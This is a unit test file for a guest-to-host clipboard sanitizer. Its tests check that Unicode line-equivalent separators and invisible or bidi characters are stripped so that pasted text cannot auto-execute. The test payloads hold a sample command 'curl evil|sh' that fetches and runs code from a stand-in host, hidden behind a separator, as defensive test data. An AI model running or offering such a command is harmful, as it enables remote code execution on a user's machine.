/**
 * sanitizeGuestText unit tests.
 *
 * Security focus (SEC-SANITIZE-1): a hostile guest must not be able to smuggle
 * newline-EQUIVALENT control characters into the host clipboard. Many host
 * shells/editors treat U+2028 (LINE SEPARATOR), U+2029 (PARAGRAPH SEPARATOR)
 * and U+0085 (NEL) as line breaks, so leaving them in a guest→host paste would
 * re-enable the very auto-execute that the trailing-newline strip exists to
 * prevent. They MUST be neutralized.
 *
 * Dangerous characters are written as \uXXXX escapes (never raw) so the source
 * stays free of invisible/control bytes that editors silently mangle.
 */

import { describe, it, expect } from 'vitest';
import { sanitizeGuestText } from '../sanitize';

const LINE_SEPARATOR = '\u2028';
const PARAGRAPH_SEPARATOR = '\u2029';
const NEL = '\u0085';

describe('sanitizeGuestText', () => {
  it('preserves ordinary printable text and reports zero stripped', () => {
    const { cleaned, stripped } = sanitizeGuestText('hello world café 日本語');
    expect(cleaned).toBe('hello world café 日本語');
    expect(stripped).toBe(0);
  });

  it('preserves tabs, LF, CR and form feed', () => {
    const input = 'a\tb\nc\rd\fe';
    const { cleaned, stripped } = sanitizeGuestText(input);
    expect(cleaned).toBe(input);
    expect(stripped).toBe(0);
  });

  describe('SEC-SANITIZE-1: newline-equivalent separators are neutralized', () => {
    it('strips U+2028 LINE SEPARATOR', () => {
      const payload = `echo safe${LINE_SEPARATOR}curl evil|sh`;
      const { cleaned, stripped } = sanitizeGuestText(payload);
      expect(cleaned).toBe('echo safecurl evil|sh');
      expect(cleaned).not.toContain(LINE_SEPARATOR);
      expect(stripped).toBe(1);
    });

    it('strips U+2029 PARAGRAPH SEPARATOR', () => {
      const payload = `echo safe${PARAGRAPH_SEPARATOR}curl evil|sh`;
      const { cleaned, stripped } = sanitizeGuestText(payload);
      expect(cleaned).toBe('echo safecurl evil|sh');
      expect(cleaned).not.toContain(PARAGRAPH_SEPARATOR);
      expect(stripped).toBe(1);
    });

    it('strips U+0085 NEL (next line)', () => {
      const payload = `echo safe${NEL}curl evil|sh`;
      const { cleaned, stripped } = sanitizeGuestText(payload);
      expect(cleaned).toBe('echo safecurl evil|sh');
      expect(cleaned).not.toContain(NEL);
      expect(stripped).toBe(1);
    });

    it('strips a mix of all three line-equivalents in one payload', () => {
      const payload = `a${LINE_SEPARATOR}b${PARAGRAPH_SEPARATOR}c${NEL}d`;
      const { cleaned, stripped } = sanitizeGuestText(payload);
      expect(cleaned).toBe('abcd');
      expect(cleaned).not.toMatch(/[\u0085\u2028\u2029]/);
      expect(stripped).toBe(3);
    });
  });

  it('still strips the pre-existing dangerous classes (BOM, zero-width, bidi)', () => {
    // U+FEFF BOM, U+200B zero-width space, U+202E RLO bidi override.
    const input = '\uFEFFa\u200Bb\u202Ecd';
    const { cleaned, stripped } = sanitizeGuestText(input);
    expect(cleaned).toBe('abcd');
    expect(stripped).toBe(3);
  });
});
